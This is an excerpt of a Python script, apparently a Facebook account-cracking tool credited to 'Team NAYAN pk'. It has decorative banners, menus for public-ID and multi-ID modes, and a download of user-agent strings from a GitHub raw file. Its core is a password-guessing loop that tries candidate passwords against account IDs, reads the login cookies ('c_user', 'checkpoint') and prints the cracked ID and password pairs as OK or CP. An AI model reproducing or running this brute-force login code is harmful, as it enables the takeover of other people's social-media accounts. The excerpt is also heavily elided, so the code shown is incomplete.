...
try:
	...
	print('[[\x1b[1;92mok black\x1b[1;97m] [\x1b[1;96mḘ̴̎R̷̐͜R̸̢͝O̸͕̐R̶͎̂ Į̴͑Ṉ̶͊T̵̺̔E̴̢͐Ṟ̷̅N̵̨̆E̵͇̾T̸̠̚....')
...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/muhammadchand09/janu/main/new.txt').text
		ua=open('.bbnew.txt','w')
...
|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅| Team NAYAN pk  |̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|

|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|  ᴛᴏᴏʟ ʙʏ ɪɴsᴀɴᴇ   |̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|

|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅| fress tool  |̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|

|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅| 웃 Pakistan 웃  |̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|      ╰╮✾╭╯✯ ɪɴsʌɴᴇ ✯╰╮✾╭╯
...
def menu():
	os.system('clear')
	print(logo)
	print('\033[0;1m[ \033[31;1m1 \033[0;1m] 𝐈𝐃 𝐏𝐔𝐁𝐋𝐈𝐂')
	print('\033[0;1m[ \033[31;1m2 \033[0;1m] 𝐈𝐃 𝐏𝐔𝐁𝐋𝐈𝐂 10')
...
def multi():
	...
	try:
		os.system('clear')
		print(logo)
		limit = int(input('\033[0;1m[ + \033[0;1m] 𝐂𝐇𝐀𝐍𝐃 𝐃𝐀𝐍𝐀 𝐈𝐃 𝐃𝐀𝐃𝐀𝐍𝐀𝐘𝐈  ?: '))
...
#---------------------
	os.system('clear')
	print(logo)
	print('\033[0;1m[ \033[1;91m1 \033[0;1m] ( 𝐀𝐏𝐈 )\n\033[0;1m[ \033[1;91m2 \033[0;1m] 𝐌𝐎𝐁𝐈𝐋𝐄\n\033[0;1m[ \033[1;91m3 \033[0;1m] 𝐅𝐑𝐄𝐄')
...
def passwrd():
	...
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] 𝐂𝐑𝐀𝐂𝐊 𝐆𝐎𝐎𝐃 𝐖𝐀𝐈𝐓 \033[0;1m( \033[32m𝐌𝐑 𝐈𝐍𝐒𝐀𝐍𝐄 \033[0;1m)')
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] 𝐒𝐓𝐎𝐏 𝐂𝐑𝐀𝐂𝐊 \033[0;1m( \033[32m𝐂𝐓𝐑𝐋+𝐙 \033[0;1m)')
	print('\033[1;91m-------------------------------------------')
	...
	for pw in pwv: 
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[0;1FB \033[33;1mNAYAN CP: {idf};{pw}')
				cp+=1
				break
				...
				print('\n')
				print(f'\033[0;1mFB \033[32;1mNAYAN OK: {idf};{pw}')
				ok+= 1
				break
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[33;1mNAYAN CP:\nFB ID: {idf}\nFB PASS: {pw}')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\n')
				print(f'\033[32;1mNAYAN OK:\nFB ID: {idf}\nFB PASS: {pw}')
				ok+=1
				break
